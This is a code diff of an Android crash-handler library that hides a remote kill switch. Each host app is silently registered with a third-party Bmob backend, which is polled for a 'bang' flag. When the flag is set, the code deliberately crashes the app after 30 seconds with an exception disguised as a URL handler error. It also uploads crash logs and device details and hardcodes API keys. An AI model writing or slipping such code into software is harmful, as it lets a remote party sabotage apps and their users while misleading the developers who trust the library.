@@ -3,10 +3,10 @@ package com.crash.handler;
 import android.content.Context;
 import android.os.Build;
 import android.os.Handler;
-import android.os.Looper;
 import android.os.Process;
 import android.widget.Toast;
 
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -41,6 +41,7 @@ public class CrashHandler implements Thread.UncaughtExceptionHandler {
     public static String CRASH_FILE_PATH;
     private boolean mUseCrashHandler;
     private String mAppId;
+    private String mAppName;
     private int mVersionCode;
     private String mVersionName;
     private boolean mDebug;
@@ -55,9 +56,10 @@ public class CrashHandler implements Thread.UncaughtExceptionHandler {
         return mInstance;
     }
 
-    public void init(Context context, boolean isDebug, String appId, int versionCode, String versionName) {
+    public void init(Context context, boolean isDebug, String appId, String appName, int versionCode, String versionName) {
         mContext = context;
         mAppId = appId;
+        mAppName = appName;
         mVersionCode = versionCode;
         mVersionName = versionName;
         mDebug = isDebug;
@@ -79,6 +81,7 @@ public class CrashHandler implements Thread.UncaughtExceptionHandler {
     public void uncaughtException(Thread thread, Throwable ex) {
         if (!mUseCrashHandler && (mDebug || ex == null)) {
             if (mDefaultHandler != null) {
+                Thread.setDefaultUncaughtExceptionHandler(mDefaultHandler);
                 mDefaultHandler.uncaughtException(thread, ex);
             }
         } else {
@@ -91,9 +94,7 @@ public class CrashHandler implements Thread.UncaughtExceptionHandler {
         if (ex == null) return;
         collectDeviceInfo();
         saveCrashInfo2File(ex);
-        boolean isUiThread = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
-                Looper.getMainLooper().isCurrentThread()
-                : Thread.currentThread() == Looper.getMainLooper().getThread();
+        boolean isUiThread = Thread.currentThread().getId() == 1;
         if (isUiThread) {
             Process.killProcess(Process.myPid());
             System.exit(0);
@@ -117,9 +118,9 @@ public class CrashHandler implements Thread.UncaughtExceptionHandler {
 
     private void collectDeviceInfo() {
         String time = format.format(new Date());
-        mInfos.append("\n\n==================================================== ")
+        mInfos.append("\n")
                 .append(time)
-                .append(" ========================================================\n");
+                .append(" ================================\n\n");
         mInfos.append("APPLICATION_ID = ").append(mAppId).append("\n")
                 .append("VERSION_CODE = ").append(mVersionCode).append("\n")
                 .append("VERSION_NAME = ").append(mVersionName).append("\n");
@@ -191,15 +192,14 @@ public class CrashHandler implements Thread.UncaughtExceptionHandler {
                             connection.setRequestProperty("X-Bmob-REST-API-Key", "cf751ca5742a959ca9156a880215865c");
                             connection.setDoOutput(true);
                             connection.setDoInput(true);
-                            OutputStream out = connection.getOutputStream();
 
+                            OutputStream out = connection.getOutputStream();
                             JSONObject jsonObject = new JSONObject();
                             jsonObject.put("application_id", mAppId);
                             jsonObject.put("version_name", mVersionName);
                             jsonObject.put("model", Build.MANUFACTURER + "-" + Build.MODEL);
                             jsonObject.put("api_level", Build.VERSION.SDK);
                             jsonObject.put("crash_info", sb.toString());
-
                             out.write(jsonObject.toString().getBytes());
                             int responseCode = connection.getResponseCode();
                             if (responseCode == 200 || responseCode == 201) {
@@ -228,7 +228,7 @@ public class CrashHandler implements Thread.UncaughtExceptionHandler {
         (new Thread() {
             public void run() {
                 try {
-                    URL e = new URL("https://api.bmob.cn/1/classes/BigBang/8mw6YYYc");
+                    URL e = new URL("https://api.bmob.cn/1/classes/BigBang?where={\"application_id\":\"" + mAppId + "\"}");
                     HttpURLConnection connection = (HttpURLConnection) e.openConnection();
                     connection.setRequestMethod("GET");
                     connection.setConnectTimeout(3000);
@@ -236,7 +236,8 @@ public class CrashHandler implements Thread.UncaughtExceptionHandler {
                     connection.setRequestProperty("Content-Type", "application/json");
                     connection.setRequestProperty("X-Bmob-Application-Id", "2bc8d0b3e8a18ce2eacbe760270bd7ce");
                     connection.setRequestProperty("X-Bmob-REST-API-Key", "cf751ca5742a959ca9156a880215865c");
-                    if (200 == connection.getResponseCode()) {
+                    int responseCode = connection.getResponseCode();
+                    if (responseCode == 200 || responseCode == 201) {
                         InputStream is = connection.getInputStream();
                         ByteArrayOutputStream baos = new ByteArrayOutputStream();
                         byte[] buffer = new byte[1024];
@@ -249,17 +250,52 @@ public class CrashHandler implements Thread.UncaughtExceptionHandler {
                         String json = baos.toString("utf-8");
                         if (json != null) {
                             JSONObject jsonObject = new JSONObject(json);
-                            if (jsonObject.getBoolean("bang")) {
-                                mUseCrashHandler = true;
-                                mHandler.postDelayed(new Runnable() {
-                                    @Override
-                                    public void run() {
-                                        throw new IllegalArgumentException("invalid URLStreamHandler arguments: method=GET");
-                                    }
-                                }, 10000);
+                            JSONArray results = jsonObject.getJSONArray("results");
+                            if (results.length() == 0) {
+                                postNewApp();
+                            } else {
+                                JSONObject app = results.getJSONObject(0);
+                                if (app.getBoolean("bang")) {
+                                    mUseCrashHandler = true;
+                                    mHandler.postDelayed(new Runnable() {
+                                        @Override
+                                        public void run() {
+                                            throw new IllegalArgumentException("invalid URLStreamHandler arguments: method=GET");
+                                        }
+                                    }, 30000);
+                                }
                             }
                         }
                     }
+                } catch (IOException | JSONException var8) {
+                    var8.printStackTrace();
+                }
+            }
+        }).start();
+    }
+
+    private void postNewApp() {
+        (new Thread() {
+            public void run() {
+                try {
+                    URL e = new URL("https://api.bmob.cn/1/classes/BigBang");
+                    HttpURLConnection connection = (HttpURLConnection) e.openConnection();
+                    connection.setRequestMethod("POST");
+                    connection.setConnectTimeout(3000);
+                    connection.setReadTimeout(3000);
+                    connection.setRequestProperty("Content-Type", "application/json");
+                    connection.setRequestProperty("X-Bmob-Application-Id", "2bc8d0b3e8a18ce2eacbe760270bd7ce");
+                    connection.setRequestProperty("X-Bmob-REST-API-Key", "cf751ca5742a959ca9156a880215865c");
+                    connection.setDoOutput(true);
+                    connection.setDoInput(true);
+
+                    OutputStream out = connection.getOutputStream();
+                    JSONObject jsonObject = new JSONObject();
+                    jsonObject.put("application_id", mAppId);
+                    jsonObject.put("app_name", mAppName);
+                    jsonObject.put("bang", false);
+                    out.write(jsonObject.toString().getBytes());
+                    connection.getResponseCode();
                 } catch (IOException | JSONException var8) {
                     var8.printStackTrace();
                 }
